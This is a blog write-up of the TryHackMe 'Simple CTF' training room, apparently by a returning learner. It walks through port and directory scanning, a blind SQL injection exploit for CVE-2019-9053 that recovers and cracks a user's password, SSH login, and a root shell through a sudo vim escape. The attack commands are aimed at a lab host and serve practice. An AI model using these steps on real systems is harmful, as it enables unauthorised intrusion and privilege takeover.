---
title: "Simple CTF - TryHackMe"
date: 2026-03-22
categories: [CTF, TryHackMe]
tags: [ctf, linux, sqli, privilege-escalation]
---

SimpleCTF is a room on TryHackMe, its a beginner CTF which I figured would be a good introduction considering I haven't done any CTF work in many months.

## Enumeration

```bash
nmap -sV -T5 10.67.139.199
```

```
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Googled for vulnerabilities in any of the running services. Found nothing useful for vsftpd. Apache turned up CVE-2019-0211 which appears to be an exploit for privilege escalation but was rejected by the room.

I tried visiting the website only to be greeted by a default Apache page. Which threw me through a loop for a bit, I then realized I should run a directory scan on the website in case it isn't just a blank Apache site.

```bash
gobuster dir -u http://10.67.139.199 -w /usr/share/wordlists/dirb/common.txt
```

```
/.hta                 (Status: 403)
/.htpasswd            (Status: 403)
/.htaccess            (Status: 403)
/index.html           (Status: 200)
/server-status        (Status: 403)
/simple               (Status: 301) [--> http://10.67.139.199/simple/]
/robots.txt           (Status: 200)
```

## Exploitation

Going to `/simple` takes me to a blank installation of CMS Made Simple v2.2.8. Googling the version reveals there is CVE-2019-9053, which is accepted by the room. This means the application is vulnerable to SQL Injection. In specific it's vulnerable to a blind SQL injection in the search function, the exploit is able to reconstruct the credentials by timing the database responses rather than getting them directly.

I found a working exploit script linked on nist.gov: https://github.com/Perseus99999/CVE-2019-9053-working-/blob/main/exploit.py

```bash
python3 exploit.py -u http://10.67.139.199 --crack -w /usr/share/wordlists/rockyou.txt
```

It errored at first because I didn't have termcolor installed, so a quick `pip install termcolor` and off it went. After a few minutes it returned:

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

From there I was able to successfully log into the web panel, however there didn't seem to be much to do. I went to SSH on port 2222 and tried the login, which worked.

```bash
ssh mitch@10.67.139.199 -p 2222
```

```bash
ls
# user.txt
cat user.txt
# G00d j0b, keep up!
```

`pwd` returned `/home/mitch` so I moved to `/home` where I discovered there was another directory called `sunbath`, but didn't have permissions to view it as mitch.

## Privilege Escalation

```bash
sudo -l
```

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

So I can spawn an elevated shell using vim. I googled for vim escalation and found the answer on GTFOBins:

```bash
sudo vim -c ':!/bin/sh'
```

And we can see a successful result:

```bash
whoami
root
```

Navigated to `/root` and grabbed the final flag:

```bash
cat root.txt
# W3ll d0n3. You made it!
```

## Conclusion

This CTF while obviously not particularly difficult in the grand scheme of things helped me get back into the swing of things and helped me feel a lot more confident. I learned where to find resources for privilege escalation like https://gtfobins.github.io. There were a few times where I had to look things up or consult Claude for hints such as I didn't remember the `sudo -l` command straight off the top of my head, but the actual methodology I didn't have an issue with for the most part. Granted this was a pretty easy CTF and I'm sure I would struggle a lot more with a harder one but overall a good experience, this is also the first time I've taken notes and done a write up.